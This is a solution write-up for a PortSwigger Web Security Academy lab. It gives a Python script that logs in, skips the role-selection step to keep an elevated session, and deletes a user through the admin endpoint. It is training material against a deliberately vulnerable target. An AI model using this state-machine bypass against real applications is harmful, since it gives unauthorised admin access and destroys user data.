# Lab: Authentication bypass via flawed state machine

Link to lab: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine

## Solution

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

sess = requests.Session()

# Get login

response = requests.get('https://0adc004303abb000c075b8cb00f900ec.web-security-academy.net/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

# Post login

cookies = {
    'session': session,
}

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    'https://0adc004303abb000c075b8cb00f900ec.web-security-academy.net/login',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False
)

session = response.headers['set-Cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session,
}

# Skip GET /select-role keep that session


# Delete user carlos
response = requests.get(
    'https://0adc004303abb000c075b8cb00f900ec.web-security-academy.net/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)
```